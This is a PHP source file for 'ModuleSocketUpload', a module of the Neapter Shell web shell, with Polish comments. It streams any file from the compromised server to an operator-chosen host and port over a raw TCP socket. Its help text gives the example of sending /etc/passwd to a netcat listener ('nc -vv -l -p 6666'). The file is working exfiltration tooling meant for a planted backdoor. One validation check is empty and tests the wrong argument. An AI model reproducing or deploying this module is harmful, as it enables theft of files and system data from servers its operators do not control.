<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleSocketUpload - Wysylanie pliku za pomoca socket'a
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleSocketUpload extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'socketupload',
			'socketup',
			'socketput'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.01 2011-09-08 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Wysyłanie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku

	Przykład:
		socketupload localhost:6666 /etc/passwd

	NetCat:
		nc -vv -l -p 6666
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 2 )
		{
			return $this -> getHelp();
		}

		$aHost = $this -> oShell -> getHost( $this -> oShell -> aArgv[0] );

		/**
		 * Port jest wymagany
		 */
		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> oShell -> aArgv[0] );
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> oShell -> aArgv[0] ) )
		{
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> oShell -> aArgv[0] );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> oShell -> aArgv[1], 'r' ) ) )
		{
			return sprintf( 'Nie można odczytać pliku "%s"', $this -> oShell -> aArgv[1] );
		}

		while( ! feof( $rFile ) )
		{
			fwrite( $rSock, fread( $rFile, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return 'Plik został przesłany';
	}

}